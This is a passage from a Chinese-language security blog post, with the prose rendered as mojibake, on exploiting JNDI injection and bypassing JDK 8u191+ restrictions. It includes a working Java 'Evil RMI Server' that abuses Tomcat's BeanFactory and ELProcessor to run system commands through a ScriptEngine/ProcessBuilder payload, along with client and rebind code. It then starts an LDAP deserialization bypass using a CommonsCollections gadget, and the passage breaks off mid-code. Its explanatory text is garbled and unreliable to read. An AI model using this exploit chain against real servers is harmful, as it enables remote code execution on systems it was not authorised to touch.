çš„æŠ€å·§æ¥è¿›è¡ŒJNDIæ³¨å…¥çš„åˆ©ç”¨ã€‚</p><p><font style="color:rgb(80, 80, 92);">å› æ­¤ï¼Œ</font><strong><font style="color:rgb(80, 80, 92);">è¿™ç§åˆ©ç”¨æ–¹å¼çš„å‰ææ¡ä»¶å°±æ˜¯ç›®æ ‡ç¯å¢ƒçš„JDKç‰ˆæœ¬åœ¨JDK8u191ã€7u201ã€6u211ä»¥ä¸‹</font></strong><font style="color:rgb(80, 80, 92);">ã€‚</font></p></blockquote><h2 id="3-3-jndi-ç»“åˆ-CORBA"><a href="#3-3-jndi-ç»“åˆ-CORBA" class="headerlink" title="3.3 jndi ç»“åˆ CORBA"></a>3.3 <font style="color:rgb(76, 76, 87);">jndi ç»“åˆ CORBA</font></h2><blockquote><p>ä¸€ä¸ªç®€å•çš„æµç¨‹æ˜¯ï¼š<code>resolve_str</code> æœ€ç»ˆä¼šè°ƒç”¨åˆ° <code>StubFactoryFactoryStaticImpl.createStubFactory</code> å»åŠ è½½è¿œç¨‹ class å¹¶è°ƒç”¨ newInstance åˆ›å»ºå¯¹è±¡ï¼Œå…¶å†…éƒ¨ä½¿ç”¨çš„ ClassLoader æ˜¯ <code>RMIClassLoader</code>ï¼Œåœ¨ååºåˆ—åŒ– stub çš„ä¸Šä¸‹æ–‡ä¸­ï¼Œé»˜è®¤ä¸å…è®¸è®¿é—®è¿œç¨‹æ–‡ä»¶ï¼Œå› æ­¤è¿™ç§æ–¹æ³•åœ¨å®é™…åœºæ™¯ä¸­æ¯”è¾ƒå°‘ç”¨ã€‚æ‰€ä»¥å°±ä¸æ·±å…¥ç ”ç©¶äº†ã€‚</p></blockquote><h2 id="3-4-ç»•è¿‡-jdk-é«˜ç‰ˆæœ¬"><a href="#3-4-ç»•è¿‡-jdk-é«˜ç‰ˆæœ¬" class="headerlink" title="3.4 ç»•è¿‡ jdk é«˜ç‰ˆæœ¬"></a>3.4 ç»•è¿‡ jdk é«˜ç‰ˆæœ¬</h2><h3 id="3-4-1-8u191-ä¹‹å‰"><a href="#3-4-1-8u191-ä¹‹å‰" class="headerlink" title="3.4.1 8u191 ä¹‹å‰"></a>3.4.1 8u191 ä¹‹å‰</h3><p>è¿™é‡Œçš„ç‰ˆæœ¬ä¸º jdk 8u121 &lt; temp &lt; 8u191 </p><p>è¿™ä¸ªä¹‹é—´ç‰ˆæœ¬ç»•è¿‡æ–¹æ³•ä¾¿æ˜¯ä¸Šæ–‡æ‰€è¿°çš„ ldap çš„ jndi æ¼æ´</p><h3 id="3-4-2-8u191-ä¹‹å"><a href="#3-4-2-8u191-ä¹‹å" class="headerlink" title="3.4.2 8u191 ä¹‹å"></a>3.4.2 8u191 ä¹‹å</h3><p><strong><font style="color:rgb(80, 80, 92);">8u191 ä¹‹åï¼Œåœ¨ä½¿ç”¨ </font></strong><code>URLClassLoader</code><strong><font style="color:rgb(80, 80, 92);"> åŠ è½½å™¨åŠ è½½è¿œç¨‹ç±»æ—¶ï¼Œ</font></strong><font style="color:rgb(80, 80, 92);">é€šè¿‡æ·»åŠ  </font><strong><font style="color:rgb(83, 83, 96);">trustURLCodebase çš„å€¼æ˜¯å¦ä¸º true</font></strong><font style="color:rgb(80, 80, 92);"> ï¼Œè®©æˆ‘ä»¬æ— æ³•åŠ è½½ codebaseï¼Œä¹Ÿå°±æ˜¯æ— æ³•è¿›è¡Œ URLClassLoader çš„æ”»å‡»ã€‚</font></p><p><font style="color:rgb(80, 80, 92);">è¦æƒ³ç»•è¿‡å°±è¦æ‰¾åˆ°è¿™ä¹ˆä¸€ä¸ªç±»ï¼š</font></p><ul><li><font style="color:rgb(80, 80, 92);">æœåŠ¡ç«¯æœ¬åœ° ClassPath ä¸­å­˜åœ¨æ¶æ„ Factory ç±»å¯è¢«åˆ©ç”¨æ¥ä½œä¸º Reference Factory è¿›è¡Œæ”»å‡»åˆ©ç”¨</font></li><li><font style="color:rgb(80, 80, 92);">Factory ç±»å¿…é¡»å®ç° </font><code>javax.naming.spi.ObjectFactory</code><font style="color:rgb(80, 80, 92);"> æ¥å£ï¼Œå¯åˆ©ç”¨è¯¥æ¥å£çš„ getObjectInstance() æ–¹æ³•</font></li></ul><p>æˆ‘ä»¬æ‰¾åˆ° <code>org.apache.naming.factory.BeanFactory</code>ç±»ï¼Œå…¶æ»¡è¶³ä¸Šè¿°æ¡ä»¶å¹¶å­˜åœ¨äº Tomcat8 ä¾èµ–åŒ…ä¸­ï¼Œåº”ç”¨å¹¿æ³›ã€‚è¯¥ç±»çš„ <code>getObjectInstance()</code> å‡½æ•°ä¸­ä¼šé€šè¿‡åå°„çš„æ–¹å¼å®ä¾‹åŒ– Reference æ‰€æŒ‡å‘çš„ä»»æ„ Bean Class(Bean Class å°±ç±»ä¼¼äºæˆ‘ä»¬ä¹‹å‰è¯´çš„é‚£ä¸ª CommonsBeanUtils è¿™ç§)ï¼Œå¹¶ä¸”ä¼šè°ƒç”¨ setter æ–¹æ³•ä¸ºæ‰€æœ‰çš„å±æ€§èµ‹å€¼ã€‚è€Œè¯¥ Bean Class çš„ç±»åã€å±æ€§ã€å±æ€§å€¼ï¼Œå…¨éƒ½æ¥è‡ªäº Reference å¯¹è±¡ï¼Œå‡æ˜¯æ”»å‡»è€…å¯æ§çš„ã€‚</p><h4 id="ç»•è¿‡ä¸€ï¼šåˆ©ç”¨æœ¬åœ°æ¶æ„-Class"><a href="#ç»•è¿‡ä¸€ï¼šåˆ©ç”¨æœ¬åœ°æ¶æ„-Class" class="headerlink" title="ç»•è¿‡ä¸€ï¼šåˆ©ç”¨æœ¬åœ°æ¶æ„ Class"></a>ç»•è¿‡ä¸€ï¼š<font style="color:rgb(76, 76, 87);">åˆ©ç”¨æœ¬åœ°æ¶æ„ Class</font></h4><h5 id="ç¯å¢ƒï¼š"><a href="#ç¯å¢ƒï¼š" class="headerlink" title="ç¯å¢ƒï¼š"></a>ç¯å¢ƒï¼š</h5><p>é¦–å…ˆæ˜¯ tomcat ç¯å¢ƒï¼Œä»¥ä¸‹ä¸‰ä¸ªå¿…é¡»å­˜åœ¨å¹¶ä¸”ç‰ˆæœ¬å°½é‡é€‰åœ¨ 9.0.64 ä»¥å‰çš„ï¼Œï¼ˆ9.0.64 ä»¥åçš„ç‰ˆæœ¬å¤§å¤šæ•°æ¼æ´éƒ½è¢«ä¿®å¤äº†ï¼Œä¸èƒ½åˆ©ç”¨ï¼‰</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/org.apache.tomcat/tomcat-el-api --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.tomcat<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>tomcat-el-api<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>8.5.66<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br><span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/org.apache.tomcat/tomcat-jasper-el --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.tomcat<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>tomcat-jasper-el<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>8.5.66<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br><span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/org.apache.tomcat/tomcat-catalina --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.tomcat<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>tomcat-catalina<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>8.5.66<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><h5 id="æºç å¤ç°ï¼š"><a href="#æºç å¤ç°ï¼š" class="headerlink" title="æºç å¤ç°ï¼š"></a>æºç å¤ç°ï¼š</h5><p>å‚è€ƒï¼š<a href="https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/#2-jdk-%E7%89%88%E6%9C%AC%E5%9C%A8-8u191-%E4%B9%8B%E5%90%8E%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F">https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/#2-jdk-%E7%89%88%E6%9C%AC%E5%9C%A8-8u191-%E4%B9%8B%E5%90%8E%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F</a> </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;<br><span class="hljs-keyword">import</span> org.apache.naming.ResourceRef;<br><br><span class="hljs-keyword">import</span> javax.naming.StringRefAddr;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-comment">// JNDI é«˜ç‰ˆæœ¬ jdk ç»•è¿‡æœåŠ¡ç«¯  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JNDIBypassHighJava</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        System.out.println(<span class="hljs-string">&quot;[*]Evil RMI Server is Listening on port: 1099&quot;</span>);<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry( <span class="hljs-number">1099</span>);<br>        <span class="hljs-comment">// å®ä¾‹åŒ–Referenceï¼ŒæŒ‡å®šç›®æ ‡ç±»ä¸ºjavax.el.ELProcessorï¼Œå·¥å‚ç±»ä¸ºorg.apache.naming.factory.BeanFactory</span><br>        <span class="hljs-type">ResourceRef</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResourceRef</span>(<span class="hljs-string">&quot;javax.el.ELProcessor&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>,<br>                                          <span class="hljs-literal">true</span>,<span class="hljs-string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>,<span class="hljs-literal">null</span>);<br>        <span class="hljs-comment">// å¼ºåˆ¶å°†&#x27;x&#x27;å±æ€§çš„setterä»&#x27;setX&#x27;å˜ä¸º&#x27;eval&#x27;, è¯¦ç»†é€»è¾‘è§BeanFactory.getObjectInstanceä»£ç </span><br>        ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;forceString&quot;</span>, <span class="hljs-string">&quot;x=eval&quot;</span>));<br>        <span class="hljs-comment">// åˆ©ç”¨è¡¨è¾¾å¼æ‰§è¡Œå‘½ä»¤</span><br>        ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;x&quot;</span>, <span class="hljs-string">&quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;)&quot;</span> +<br>                                  <span class="hljs-string">&quot;.newInstance().getEngineByName(\&quot;JavaScript\&quot;)&quot;</span> +<br>                                  <span class="hljs-string">&quot;.eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;calc&#x27;]).start()\&quot;)&quot;</span>));<br>        System.out.println(<span class="hljs-string">&quot;[*]Evil command: calc&quot;</span>);<br>        <span class="hljs-type">ReferenceWrapper</span> <span class="hljs-variable">referenceWrapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceWrapper</span>(ref);<br>        registry.bind(<span class="hljs-string">&quot;Object&quot;</span>, referenceWrapper);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>â€‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.naming.ResourceRef;<br><br><span class="hljs-keyword">import</span> javax.naming.InitialContext;<br><span class="hljs-keyword">import</span> javax.naming.StringRefAddr;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JNDIBypassHighJavaServerRebind</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br><br>        <span class="hljs-type">InitialContext</span> <span class="hljs-variable">initialContext</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br>        <span class="hljs-type">ResourceRef</span> <span class="hljs-variable">resourceRef</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResourceRef</span>(<span class="hljs-string">&quot;javax.el.ELProcessor&quot;</span>,<span class="hljs-literal">null</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<br>                                                  <span class="hljs-literal">true</span>,<span class="hljs-string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>,<span class="hljs-literal">null</span> );<br>        resourceRef.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;forceString&quot;</span>, <span class="hljs-string">&quot;x=eval&quot;</span>));<br>        resourceRef.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;x&quot;</span>,<span class="hljs-string">&quot;Runtime.getRuntime().exe(&#x27;calc&#x27;)&quot;</span> ));<br>        initialContext.rebind(<span class="hljs-string">&quot;rmi://localhost:1099/remoteObj&quot;</span>, resourceRef);<br>        System.out.println(<span class="hljs-string">&quot;ServerRebind Success&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.naming.Context;<br><span class="hljs-keyword">import</span> javax.naming.InitialContext;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JNDIBypassHighJavaClient</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">uri</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;rmi://localhost:1099/Object&quot;</span>;<br>        <span class="hljs-type">Context</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br>        context.lookup(uri);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242115690.png"></p><h5 id="åˆ†æï¼š"><a href="#åˆ†æï¼š" class="headerlink" title="åˆ†æï¼š"></a>åˆ†æï¼š</h5><p>å‰é¢çš„æµç¨‹è¿˜æ˜¯è¿›å…¥ <code>lookup</code> æ–¹æ³•ï¼Œåˆ° <code>RegistryContext</code> ç±»çš„ <code>decodeObject()</code> æ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•å½“ä¸­è°ƒç”¨äº† <code>getObjectInstance()</code>ã€‚ç„¶åæ¥åˆ° <code>getObjectFactoryFromReference</code><font style="color:#080808;background-color:#ffffff;"> å¼€å§‹è·Ÿï¼š</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242115373.png"></p><p>ç„¶åé€šè¿‡ loadClass åŠ è½½ <code>org.apache.naming.factory.BeanFactory</code><font style="color:#080808;background-color:#ffffff;">å¹¶èµ‹å€¼ç»™ clas </font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242117328.png"></p><p><font style="color:#080808;background-color:#ffffff;">å°† clas å¼ºè½¬ä¸º </font><strong><font style="color:#080808;background-color:#ffffff;">ObjectFactory  </font></strong><font style="color:#080808;background-color:#ffffff;">ç±»å‹</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242117362.png"></p><p>ç„¶åç»è¿‡ä¸€ç³»åˆ—å¤æ‚çš„èµ‹å€¼ï¼Œæœ€ç»ˆåœ¨ ref çš„ className ä¸­è·å–åˆ°äº† â€œjavax.el.ELProcessorâ€ ï¼ŒclassFactory è·å–åˆ°äº†â€org.apache.naming.factory.BeanFactoryâ€</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242117627.png"></p><p><strong>getObjectInstance</strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242117347.png"></p><p>åˆ°äº† getObjectInstance ä¹‹åä¾¿æ˜¯æ•´ç†å˜é‡ï¼Œå‡†å¤‡æ‰§è¡Œ invoke æ–¹æ³•</p><p>ra  é€šè¿‡åˆ©ç”¨ Java çš„è„šæœ¬å¼•æ“ï¼ˆJavaScript ï¼‰åœ¨è¿è¡Œæ—¶æ„é€ å¹¶è°ƒç”¨ <code>ProcessBuilder</code>ï¼Œæœ€ç»ˆåœ¨ç›®æ ‡ä¸»æœºä¸Šæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ <code>calc</code>ï¼Œå°±æ˜¯è·å– beanClass å³ <code>javax.el.ELProcessor</code> ç±»çš„ eval() æ–¹æ³•å¹¶å’Œ x å±æ€§</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242118019.png"></p><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œçš„ä¸€ä¸ª value ä¸­å°è£…çš„å°±æ˜¯æ¶æ„ä»£ç </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242117409.png"></p><p>æœ€ç»ˆä»£ç åœ¨ method.invoke å¤„ï¼Œ<font style="color:rgb(80, 80, 92);">é€šè¿‡method.invoke()å³åå°„è°ƒç”¨çš„æ¥æ‰§è¡Œ</font><br><code>&quot;&quot;.getClass().forName(&quot;javax.script.ScriptEngineManager&quot;).newInstance().getEngineByName(&quot;JavaScript&quot;).eval(&quot;new java.lang.ProcessBuilder[&#39;(java.lang.String[])&#39;]([&#39;calc&#39;]).start()&quot;)</code>ã€‚å¼¹å‡ºè®¡ç®—å™¨ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242118772.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242118088.png"></p><h4 id="ç»•è¿‡äºŒï¼šLDAPè¿”å›åºåˆ—åŒ–æ•°æ®ï¼Œè§¦å‘æœ¬åœ°Target"><a href="#ç»•è¿‡äºŒï¼šLDAPè¿”å›åºåˆ—åŒ–æ•°æ®ï¼Œè§¦å‘æœ¬åœ°Target" class="headerlink" title="ç»•è¿‡äºŒï¼šLDAPè¿”å›åºåˆ—åŒ–æ•°æ®ï¼Œè§¦å‘æœ¬åœ°Target"></a>ç»•è¿‡äºŒï¼š<font style="color:rgb(33, 53, 71);">LDAPè¿”å›åºåˆ—åŒ–æ•°æ®ï¼Œè§¦å‘æœ¬åœ°Target</font></h4><blockquote><p>LDAP æœåŠ¡ç«¯é™¤äº†æ”¯æŒ JNDI Reference è¿™ç§åˆ©ç”¨æ–¹å¼å¤–ï¼Œè¿˜æ”¯æŒç›´æ¥è¿”å›ä¸€ä¸ªåºåˆ—åŒ–çš„å¯¹è±¡ã€‚å¦‚æœ Java å¯¹è±¡çš„ javaSerializedData å±æ€§å€¼ä¸ä¸ºç©ºï¼Œåˆ™å®¢æˆ·ç«¯çš„<code>obj.decodeObject()</code> æ–¹æ³•å°±ä¼šå¯¹è¿™ä¸ªå­—æ®µçš„å†…å®¹è¿›è¡Œååºåˆ—åŒ–ã€‚æ­¤æ—¶ï¼Œå¦‚æœæœåŠ¡ç«¯ ClassPath ä¸­å­˜åœ¨ååºåˆ—åŒ–å’¯å¤šåŠŸèƒ½åˆ©ç”¨ Gadget å¦‚ CommonsCollections åº“ï¼Œé‚£ä¹ˆå°±å¯ä»¥ç»“åˆè¯¥ Gadget å®ç°ååºåˆ—åŒ–æ¼æ´æ”»å‡»ã€‚</p></blockquote><h5 id="å¤ç°ï¼š-1"><a href="#å¤ç°ï¼š-1" class="headerlink" title="å¤ç°ï¼š"></a><font style="color:rgb(80, 80, 92);">å¤ç°ï¼š</font></h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.alibaba<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>fastjson<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2.80<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/com.unboundid/unboundid-ldapsdk --&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.unboundid<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>unboundid-ldapsdk<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.1.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>compile<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.unboundid.util.Base64;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;<br><span class="hljs-keyword">import</span> 